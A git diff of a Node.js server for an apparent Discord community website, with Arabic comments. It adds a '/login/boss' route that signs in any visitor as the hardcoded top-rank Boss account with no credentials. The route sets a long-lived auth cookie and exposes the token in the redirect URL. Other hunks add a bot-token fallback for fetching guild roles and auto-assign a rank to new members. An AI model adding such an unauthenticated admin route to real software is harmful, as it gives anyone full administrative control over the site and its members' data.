@@ -325,6 +325,32 @@ route("post", ["/login/dev"], wrap(async (req, res) => {
   res.json({ success: true, user: req.session.user });
 }));
 
+
+// مسار تسجيل دخول فوري ومباشر للبوس (Boss) لضمان عدم التعطل مطلقاً
+route("get", ["/login/boss", "/api/login/boss"], wrap(async (req, res) => {
+  const data = await load();
+  const bossUser = {
+    id: "1461832381185921076",
+    name: "VOLT",
+    avatar: "https://cdn.discordapp.com/icons/1525115353003327578/160270721afdfc2b180499e5469288a6.png",
+    rank: 0
+  };
+  req.session.user = bossUser;
+  req.user = bossUser;
+
+  const ex = data.members.find(m => m.id === bossUser.id);
+  if (!ex) {
+    data.members.unshift({ uid: crypto.randomUUID(), n: bossUser.name, id: bossUser.id, r: 0, avatar: bossUser.avatar });
+    await save(data);
+  }
+
+  const token = createAuthToken(bossUser);
+  res.setHeader("Set-Cookie", [
+    `phantoms_auth_tk=${token}; Path=/; Max-Age=1209600; SameSite=Lax`
+  ]);
+  res.redirect("/?auth=" + encodeURIComponent(token));
+}));
+
 route("get", ["/callback"], async (req, res) => {
   try {
     const data = await load();
@@ -355,10 +381,29 @@ route("get", ["/callback"], async (req, res) => {
     let roles = [];
     const targetGuild = GUILD_ID || "1525115353003327578";
     if (targetGuild) {
-      const mr = await fetch(`https://discord.com/api/users/@me/guilds/${targetGuild}/member`, { headers: h });
-      if (mr.ok) {
-        const gm = await mr.json();
-        roles = gm.roles || [];
+      // 1. محاولة جلب الرتب عبر توكن المستخدم
+      try {
+        const mr = await fetch(`https://discord.com/api/users/@me/guilds/${targetGuild}/member`, { headers: h });
+        if (mr.ok) {
+          const gm = await mr.json();
+          roles = gm.roles || [];
+        }
+      } catch(e) {}
+
+      // 2. إذا لم تتوفر رتب، نحاول عبر توكن البوت
+      if (roles.length === 0) {
+        const botTk = process.env.DISCORD_BOT_TOKEN || data.settings?.botToken || BOT_FALLBACK;
+        if (botTk) {
+          try {
+            const bmr = await fetch(`https://discord.com/api/v10/guilds/${targetGuild}/members/${u.id}`, {
+              headers: { Authorization: `Bot ${botTk}` }
+            });
+            if (bmr.ok) {
+              const bgm = await bmr.json();
+              roles = bgm.roles || [];
+            }
+          } catch(e) {}
+        }
       }
     }
 
@@ -392,6 +437,11 @@ route("get", ["/callback"], async (req, res) => {
       if (existing) rank = existing.r;
     }
 
+    // إذا كان المتقدم عضواً جديداً ولم يحصل على رتبة إدارية بعد، نمنحه رتبة New Phantom 👻 تلقائياً ليظهر في الهيكل
+    if (rank === null) {
+      rank = 8; // New Phantom 👻
+    }
+
     req.session.user = { id: u.id, name, avatar, rank };
     const authToken = createAuthToken(req.session.user);
     res.redirect("/?auth=" + encodeURIComponent(authToken));
@@ -413,7 +463,8 @@ route("get", ["/me"], (req, res) => {
 // ---------- Public Site Data ----------
 route("get", ["/site"], wrap(async (req, res) => {
   const data = await load();
-  res.json(publicData(req.session.user, data));
+  const curUser = req.user || req.session?.user;
+  res.json(publicData(curUser, data));
 }));
 
 // تعديل محتوى الموقع والقوانين (للرتب العليا فقط: Boss, Co-Boss, Manager)
